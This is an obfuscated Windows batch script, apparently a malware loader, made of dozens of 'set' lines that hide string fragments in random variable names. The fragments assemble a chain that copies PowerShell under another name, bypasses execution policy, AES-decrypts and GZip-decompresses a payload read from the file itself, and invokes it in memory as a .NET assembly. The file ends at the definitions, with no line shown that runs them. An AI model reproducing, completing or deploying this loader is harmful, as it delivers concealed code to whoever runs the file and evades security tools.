@echo off
set "hLFKyOSSSz=st"
set "YitglGUpND=\v"
set "dgJlrSObKu=\W"
set "klzUEvEFsT=1."
set "jSZkJgKYBr= /"
set "mLkgdsSZXR= C"
set "AWtTXHuNjt=we"
set "RBLzQLsvzM=he"
set "luVQHjfRQc=:\"
set "NNsBPetPeO=ll"
set "PPKgKyjrnF=Po"
set "ANwlSjFOAk=rs"
set "CwJDTJQmAw=Sy"
set "mBVrsRPwqu=Wi"
set "NiUutgnYSt=rS"
set "MqwkOZbHll=.e"
set "nWKrcHKsQH=xe"
set "jvRHtCnyWu=we"
set "TWaoMXHRMq=in"
set "ujGZDiNfjQ=32"
set "lJCwyBfALQ=y "
set "berNAdLFlD=he"
set "ExIdzTsjIy=ow"
set "VmAoywwGUL=co"
set "noZpIIlCku=py"
set "DuLiiLPSNl=s\"
set "XCDJqkculg=nd"
set "zFORQDQuAE=em"
set "KtdyKAXVle=ll"
set "WPCFGaPsEo=0\"
set "aMIcwtWCAY=ws"
set "SvLVcXeGhp=do"
set "NyTduSLkCU=po"
set "YeGulGAEkp=cd"
set "CIrtZwMorI= %~dp0"
set "xUPLlKRYSB=oin "
set "xSfGlODFnK=G = "
set "JIdvrCAbhr=tS46"
set "PNVzLUByjw=PKCS"
set "MkBDPtXIhK=th('"
set "lEgdoRJHKk=.Cry"
set "PbtlChOPrW=BC;$"
set "WlGKVaWblk=stem"
set "CFKtoXybRc=.Dis"
set "weKFZYkJWw=sRf "
set "XHlarxMbbK=e]::"
set "LLUXirUeLb=nage"
set "cfvFNJrFrK=m.IO"
set "THxZzEDtma=nirt"
set "INdyBpWWnb=pias"
set "oLiFtcwBTT=Obje"
set "eQoMavXNbi=gMod"
set "SdIOEFJwaA=$wAn"
set "VwLCnWZWJO=]::("
set "wZCjyUXtOm=d = "
set "kBekzLnDmw=comp"
set "aorUWRuExj=Comp"
set "IpVKjHdWhe=ose("
set "kEiTuWTrWR=).Sp"
set "kidPWQZWNl=ring"
set "mBFniaUYNM=XZa "
set "fcFjSXYpTJ=BnNj"
set "bYyLnABQMA=ddin"
set "haavtnNnqc=ect "
set "qLMnRkFLNS=ert]"
set "xoAuBoMnDN=raph"
set "ctFOPELuso=ewLi"
set "AoSMCOsBDo=Secu"
set "XvducGwtGC=.GZi"
set "BQoKneENrZ=1] -"
set "cEjDBMnYpd=ateD"
set "TXeGeuEUMh=ispo"
set "kIYwNUggvi=daeR"
set "jJeFrKGBhf=ion."
set "IVUQxQFqzf=Invo"
set "kkkxHeILyT=gnir"
set "CKKwOGRIYx=yG ="
set "yvycFdJGDb=($wo"
set "oUAMhILstT=Za.T"
set "WJYGaKjyjY=.Dis"
set "UAgDopYllQ=[IO."
set "qIhkgllKfF=ct S"
set "WIpEnkLuJH=$IhQ"
set "utwTRWDWpQ===')"
set "iVLxLAeFVO=bypa"
set "kqThRyJcfk=THxh"
set "CzLVnIXTuW=yste"
set "FyJgNaSxxl=esaB"
set "bEuxgtdAhk=oz.T"
set "MCkeTmZQBQ='txe"
set "GWsSTGJMSl=();$"
set "NtklHqJKLv=eOeC"
set "HOeOPZdbJY=rans"
set "rBaBAuIiRJ=V = "
set "XssumPhbJO=ay()"
set "BbrgujwOGB=ecry"
set "mbQshjImmY=yste"
set "wowMHKIwej=rt]:"
set "IbXwxDyZgf= [Sy"
set "yihOYuiNFG=.Ass"
set "dgrNEGncsq=New-"
set "lnZtpAGKpB=ne);"
set "QlKlAKrgep=ode]"
set "xrgOGOSEKB=ptog"
set "dGJvRrrSiJ=;$fP"
set "AnaSPIATwQ=d, 0"
set "AEKihIbMpp=ach "
set "RFfPKZVwzT=osRK"
set "aFjYSaVpvR=HO3I"
set "tfuhMMsUrr=sRf."
set "EdDQQueSDQ=c.En"
set "lRFBESKakL=BnNj"
set "kOXiPgFoZE='oPV"
set "mUnzLOszSz='[-1"
set "SpZQRuzNPs=rity"
set "zBFpZAlGod=Obje"
set "tvXInJjUoa=bstr"
set "TMebjTftsq=[Sys"
set "TDNblerhvt=ddin"
set "buKEEBVdmP=  $b"
set "PdiVStLyNL=fore"
set "isFLAlgEwG=-joi"
set "PLPBBxxcTd=OeC."
set "KxhDxKUPOB=.Cry"
set "RejADgKiBD=:('g"
set "aSWfksCTUa=BnNj"
set "zBdnxFPHUB=onve"
set "sPrBXmXCdh=vert"
set "FNQroRKYkN=tsWi"
set "hhfXjaPnPp=f.Su"
set "voEQjVyVvT=tryP"
set "QpKAzEGGhz=..-1"
set "cSwCmGHuHH=hy.A"
set "SOAoVNgynh=ck($"
set "fDgXQTHgJF=trea"
set "ZcdvAurDJq=saBm"
set "iyjbThutNt=LYc "
set "uxEZIyKkXD=6esa"
set "eCZnpJCVBF=zm83"
set "PjqNjjBqxd=cG.D"
set "JdnGEFvsqd=Kd);"
set "AGErjgdTvY=grap"
set "kwtSWKnTfl=uFVa"
set "ilMmIetyla=)))"
set "vaCTASvhhv=sRKd"
set "wPCPsNBkQT=ress"
set "uDbROEFZqO=2VUN"
set "nULoNBgQkd=);$j"
set "eUOnIzjVtJ=wosR"
set "DTxXuYeano=rtS4"
set "cLspPpESXk=iron"
set "gEPZmrYytV=.Mod"
set "dHvSVlkiTx=tem."
set "DcwYDILbuk=('%*'"
set "ntLaJTwhzc=XZa."
set "SFkwqqPMuB=Bmor"
set "CqAtbgknbl=sion"
set "DXqktvZgHt=.Com"
set "kEiOerqjjI=[Sys"
set "YJaahrJIkx=ress"
set "BTmUiXXShw='[-1"
set "tKxnwVHBPR=osRK"
set "KezgxsUdjA=raph"
set "myJfgIlZkr== [S"
set "XFtMxRsqrp=mory"
set "PsHeqMKxFH=oArr"
set "WFxjopzkNx=]::C"
set "yPhNpXXdFJ=urit"
set "dZkpCteguz=j.Pa"
set "hQsZEFOIym=.Len"
set "YlwrDlAfwX=ress"
set "ZCqJOAiljc=pher"
set "iIDybLtevn=n ''"
set "dVZVUWIEDT=le  "
set "OTqPtCxrUD=Stre"
set "SnhJgdfptG=-joi"
set "gkOQStauGq=IoO3"
set "jFaUFHpDnf=lBlo"
set "fdpPLHKvjL=.Sec"
set "xOTHTgDvJL=.Cop"
set "dHWDgyZzev=esMa"
set "FwEYAqFaag=('ev"
set "rCDMLQflrb=File"
set "gSVXdmXXLT=null"
set "sBhkglJgjc=Kd ="
set "GrkPpDePDi= = $"
set "gsHRxgHQUJ=tion"
set "yaWVTamzDe=ew-O"
set "mANvRAKgsW=;$iE"
set "rLsLeikCkt=and "
set "TQPMRAsJNG=)($b"
set "QdfQGHIMrY=BnNj"
set "dCxOMVckrF=ptog"
set "zXdILSXQdB=n ''"
set "EvbgVGbWWy=.IO."
set "FSVedorcOt=S46e"
set "uDXMMMYFsQ=pres"
set "bjxTjVnPHL=m.IO"
set "QzZviVZZyJ=pose"
set "SswSHmGAsh=('da"
set "HOVhphbFry=rity"
set "NwBkBsaIgE=stem"
set "xZNPxjMbSz=dV1k"
set "BLhUDmVmEh=FcNh"
set "wtsceWQjnj=$iEX"
set "SxQPmAQZBl= = N"
set "siGPPppTGm=ptor"
set "cBEwXLUNTD=)($o"
set "SIEGSxIymL=[]] "
set "maJVfZMFwo=] -j"
set "HzrhsCtuTm=rofi"
set "UMLrhVXxXi= '')"
set "VwMlARCTlC=.Con"
set "bMxWCOAZty=Syst"
set "nzYVGvFDlH=('%~f0'"
set "oXdGfNOVYV== $t"
set "TUAXlcksNu=:: '"
set "XZHjaSOiKQ=.Cre"
set "pgJobXYIpZ=se()"
set "VGgqHORwmc=orF'"
set "ZdMxofLHfn=ct S"
set "SZIutOxZWI=1..-"
